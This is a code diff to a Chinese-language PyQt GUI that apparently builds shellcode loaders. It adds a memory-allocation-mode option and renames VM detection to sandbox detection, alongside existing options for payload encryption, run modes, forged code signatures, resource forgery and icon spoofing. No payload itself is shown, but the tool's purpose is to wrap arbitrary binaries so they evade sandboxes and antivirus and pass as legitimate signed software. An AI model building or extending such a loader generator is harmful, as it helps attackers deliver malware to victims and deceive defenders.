@@ -23,6 +23,7 @@ def load_plugins_manifest():
     enc = data.get('encryption') or []
     runm = data.get('run_modes') or []
     vmc = data.get('vm_checks') or []
+    alloc_mem_modes = data.get('alloc_mem_modes') or []
     defaults = data.get('defaults') or {}
     if not enc or not runm:
         raise ValueError('plugins.json 缺少必要字段(encryption/run_modes)')
@@ -30,6 +31,7 @@ def load_plugins_manifest():
         'encryption': enc,
         'run_modes': runm,
         'vm_checks': vmc,
+        'alloc_mem_modes': alloc_mem_modes,
         'defaults': defaults,
     }
 
@@ -80,6 +82,12 @@ class WorkerThread(QThread):
             run_map = {r['id']: r['feature'] for r in manifest['run_modes']}
             run_feature = run_map.get(self.params.get('run_mode', manifest['defaults'].get('run_mode', 'enum_ui')), 'run_enum_ui')
             features.append(run_feature)
+            # 内存分配方式（feature 注入）
+            mem_feature_map = {m['id']: m['feature'] for m in manifest.get('alloc_mem_modes', [])}
+            mem_mode = self.params.get('mem_mode', manifest['defaults'].get('alloc_mem_mode', 'alloc_mem_va'))
+            mem_feature = mem_feature_map.get(mem_mode, 'alloc_mem_va')
+            features.append(mem_feature)
+
             # 资源伪造
             if self.params.get('forgery_enable'):
                 features.append('with_forgery')
@@ -259,8 +267,26 @@ class LoaderGUI(QWidget):
         ico_group.setLayout(ico_layout)
         layout.addWidget(ico_group)
 
-        # 4. VM检测（显示label，提交id）
-        vm_group = QGroupBox('🛡️ VM 检测')
+        # 4. 内存分配方式
+        mem_group = QGroupBox('🧠 内存分配方式')
+        mem_layout = QHBoxLayout()
+        self.mem_mode_box = QComboBox()
+        mem_icon = QIcon(os.path.join('icons', 'mem.ico')) if os.path.exists(os.path.join('icons', 'mem.ico')) else QIcon()
+        mem_modes = _manifest.get('alloc_mem_modes', [])
+        for m in mem_modes:
+            self.mem_mode_box.addItem(mem_icon, m.get('label', m['id']), m['id'])
+        default_mem = _manifest['defaults'].get('alloc_mem_mode', None)
+        if default_mem:
+            for i in range(self.mem_mode_box.count()):
+                if self.mem_mode_box.itemData(i) == default_mem:
+                    self.mem_mode_box.setCurrentIndex(i)
+                    break
+        mem_layout.addWidget(self.mem_mode_box)
+        mem_group.setLayout(mem_layout)
+        layout.addWidget(mem_group)
+
+        # 5. VM检测（显示label，提交id）
+        vm_group = QGroupBox('🛡️ Sandbox 检测')
         vm_layout = QVBoxLayout()
         _manifest2 = load_plugins_manifest()
         vm_items = _manifest2.get('vm_checks', [])
@@ -286,7 +312,7 @@ class LoaderGUI(QWidget):
         vm_group.setLayout(vm_layout)
         layout.addWidget(vm_group)
 
-        # 5. 运行方式
+        # 6. 运行方式
         run_group = QGroupBox('🚀 运行方式')
         run_layout = QHBoxLayout()
         self.run_mode_box = QComboBox()
@@ -305,7 +331,7 @@ class LoaderGUI(QWidget):
         run_group.setLayout(run_layout)
         layout.addWidget(run_group)
 
-        # 6. 伪造签名
+        # 7. 伪造签名
         sign_group = QGroupBox('🔏 伪造签名')
         sign_layout = QHBoxLayout()
         self.sign_app_box = SignAppComboBox()
@@ -326,12 +352,12 @@ class LoaderGUI(QWidget):
         sign_group.setLayout(sign_layout)
         layout.addWidget(sign_group)
 
-        # 7. 进度条
+        # 8. 进度条
         self.progress = QProgressBar()
         self.progress.setValue(0)
         layout.addWidget(self.progress)
 
-        # 8. 日志输出
+        # 9. 日志输出
         log_group = QGroupBox('📋 日志输出')
         log_layout = QVBoxLayout()
         self.log = QTextEdit()
@@ -340,7 +366,7 @@ class LoaderGUI(QWidget):
         log_group.setLayout(log_layout)
         layout.addWidget(log_group)
 
-        # 9. 生成按钮
+        # 10. 生成按钮
         self.gen_btn = QPushButton(QIcon(os.path.join('icons', 'rocket.ico')), '一键生成')
         self.gen_btn.setFixedHeight(38)
         self.gen_btn.clicked.connect(self.run_all)
@@ -370,7 +396,11 @@ class LoaderGUI(QWidget):
         sign_app = self.sign_app_box.itemData(self.sign_app_box.currentIndex())
         forgery_enable = self.forgery_enable_box.isChecked()
 
-        params = dict(input_bin=input_bin, run_mode=run_mode, vm_checks=vm_checks, enc_method=enc_method, icon_path=icon_path, sign_enable=sign_enable, sign_app=sign_app, forgery_enable=forgery_enable)
+        mem_mode = self.mem_mode_box.itemData(self.mem_mode_box.currentIndex()) if hasattr(self, 'mem_mode_box') else None
+        if not mem_mode:
+            _manifest3 = load_plugins_manifest()
+            mem_mode = _manifest3['defaults'].get('alloc_mem_mode', 'alloc_mem_va')
+        params = dict(input_bin=input_bin, run_mode=run_mode, vm_checks=vm_checks, enc_method=enc_method, icon_path=icon_path, sign_enable=sign_enable, sign_app=sign_app, forgery_enable=forgery_enable, mem_mode=mem_mode)
         self.worker = WorkerThread(self, params)
         self.worker.log_signal.connect(self.log_append)
         self.worker.progress_signal.connect(self.progress.setValue)
